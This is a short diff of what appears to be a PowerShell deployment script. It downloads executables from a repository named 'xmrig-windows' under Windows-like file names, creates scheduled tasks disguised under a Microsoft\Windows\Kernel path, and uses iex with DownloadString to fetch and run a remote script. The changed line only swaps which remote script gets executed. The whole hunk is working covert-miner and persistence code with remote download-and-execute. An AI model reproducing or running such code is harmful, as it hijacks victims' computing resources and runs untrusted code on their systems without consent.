@@ -7,4 +7,4 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/crenata/xmrig-windows/m
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/crenata/xmrig-windows/master/BES.exe -OutFile WinOpac.exe
 schtasks /create /xml WinSvdX.xml /tn Microsoft\Windows\Kernel\WinXeNs
 schtasks /create /xml WinNaz.xml /tn Microsoft\Windows\Kernel\WinOpac
-iex (New-Object Net.WebClient).DownloadString("https://www.leeholmes.com/projects/ps_html5/Invoke-PSHtml5.ps1")
+iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/crenata/xmrig-windows/master/rickroll.ps1")
